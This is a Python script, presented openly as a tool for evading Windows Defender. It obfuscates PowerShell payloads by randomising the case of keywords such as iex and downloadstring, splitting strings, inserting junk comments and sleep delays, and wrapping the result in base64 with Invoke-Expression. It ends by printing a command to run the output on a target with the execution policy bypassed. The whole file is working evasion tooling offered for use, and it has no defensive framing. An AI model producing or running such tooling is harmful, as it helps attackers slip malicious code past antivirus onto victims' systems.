#!/usr/bin/env python3
"""
PowerShell Obfuscation Script for Windows Defender Evasion
Applies multiple obfuscation techniques to PowerShell payloads
"""

import sys
import base64
import random
import string
import re

def random_var_name(length=8):
    """Generate random variable names for obfuscation"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def insert_junk_comments(code):
    """Insert random comments to break signature patterns"""
    lines = code.split('\n')
    obfuscated = []
    
    for line in lines:
        if random.random() > 0.7 and line.strip():
            comment = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 30)))
            obfuscated.append(f"{line} <# {comment} #>")
        else:
            obfuscated.append(line)
    
    return '\n'.join(obfuscated)

def randomize_case(code):
    """Randomize PowerShell command case (PowerShell is case-insensitive)"""
    ps_keywords = ['invoke', 'expression', 'new-object', 'system', 'net', 'webclient', 
                   'downloadstring', 'iex', 'powershell', 'bypass', 'hidden']
    
    for keyword in ps_keywords:
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        matches = pattern.findall(code)
        for match in matches:
            random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in match)
            code = code.replace(match, random_case, 1)
    
    return code

def string_concatenation(code):
    """Break strings into concatenated parts"""
    strings = re.findall(r'"([^"]+)"', code)
    
    for s in strings:
        if len(s) > 10:
            parts = []
            chunk_size = random.randint(3, 6)
            for i in range(0, len(s), chunk_size):
                parts.append(f'"{s[i:i+chunk_size]}"')
            
            concatenated = '+'.join(parts)
            code = code.replace(f'"{s}"', f"({concatenated})", 1)
    
    return code

def base64_encode_payload(code):
    """Encode the entire payload in Base64 with execution wrapper"""
    encoded = base64.b64encode(code.encode('utf-16le')).decode('ascii')
    
    # Create execution wrapper with variable substitution
    var1 = random_var_name()
    var2 = random_var_name()
    
    wrapper = f"""
${{0}} = [System.Text.Encoding]::Unicode
${{1}} = '{2}'
${{1}} = [System.Convert]::FromBase64String(${{1}})
${{1}} = ${{0}}.GetString(${{1}})
Invoke-Expression ${{1}}
""".format(var1, var2, encoded)
    
    return wrapper

def add_sleep_delays(code):
    """Add random sleep delays to evade behavioral analysis"""
    lines = code.split('\n')
    obfuscated = []
    
    for i, line in enumerate(lines):
        obfuscated.append(line)
        if random.random() > 0.8 and i < len(lines) - 1:
            delay = random.uniform(0.1, 0.5)
            obfuscated.append(f"Start-Sleep -Milliseconds {int(delay * 1000)}")
    
    return '\n'.join(obfuscated)

def obfuscate_payload(input_file, output_file):
    """Main obfuscation function"""
    try:
        with open(input_file, 'r') as f:
            original_code = f.read()
        
        print(f"[*] Original payload size: {len(original_code)} bytes")
        
        # Apply obfuscation techniques
        print("[*] Applying obfuscation techniques...")
        
        code = original_code
        code = randomize_case(code)
        print("  [+] Case randomization applied")
        
        code = string_concatenation(code)
        print("  [+] String concatenation applied")
        
        code = insert_junk_comments(code)
        print("  [+] Junk comments inserted")
        
        code = add_sleep_delays(code)
        print("  [+] Sleep delays added")
        
        # Base64 encode the entire payload
        code = base64_encode_payload(code)
        print("  [+] Base64 encoding applied")
        
        # Final case randomization on wrapper
        code = randomize_case(code)
        
        # Write obfuscated payload
        with open(output_file, 'w') as f:
            f.write(code)
        
        print(f"[+] Obfuscated payload written to: {output_file}")
        print(f"[+] Obfuscated payload size: {len(code)} bytes")
        print(f"[+] Size increase: {((len(code) / len(original_code)) - 1) * 100:.1f}%")
        
        return True
        
    except Exception as e:
        print(f"[-] Error during obfuscation: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 obfuscate_powershell.py <input.ps1> <output.ps1>")
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    
    if obfuscate_payload(input_file, output_file):
        print("\n[+] Obfuscation complete!")
        print(f"[!] Execute on target with: powershell -ExecutionPolicy Bypass -File {output_file}")
    else:
        print("\n[-] Obfuscation failed!")
        sys.exit(1)
